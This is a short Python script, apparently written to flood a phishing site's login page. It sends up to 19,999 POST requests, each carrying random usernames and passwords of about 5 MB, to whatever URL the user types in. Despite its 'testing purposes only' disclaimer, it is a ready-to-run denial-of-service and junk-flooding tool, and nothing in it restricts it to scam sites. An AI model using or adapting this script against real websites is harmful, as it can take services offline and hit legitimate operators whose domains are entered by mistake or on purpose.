import os
import sys
import random
import urllib3
import string

counter = 1
http = urllib3.PoolManager(maxsize=500)

def randomStringwithDigitsAndSymbols(stringLength=5242880):
    password_characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(password_characters) for i in range(stringLength))
print ("This tool is for testing purposes only.")
url= input("Enter URL to scamwebsite (e.g.: skinboron.in): ") 

while counter < 20000:
    user = randomStringwithDigitsAndSymbols()
    password = randomStringwithDigitsAndSymbols()
    response = http.request('POST', 'https://'+url+'/auth.php?doAuth=1&login='+user+'&password='+password)
    print (" user: "+user[0:4]+"[...] / pass: "+password[0:4]+"[...] / size of request: "+str(round(2*sys.getsizeof(user)/1024/1024, 2))+"MB / http_status: "+str(response.status))
    counter += 1
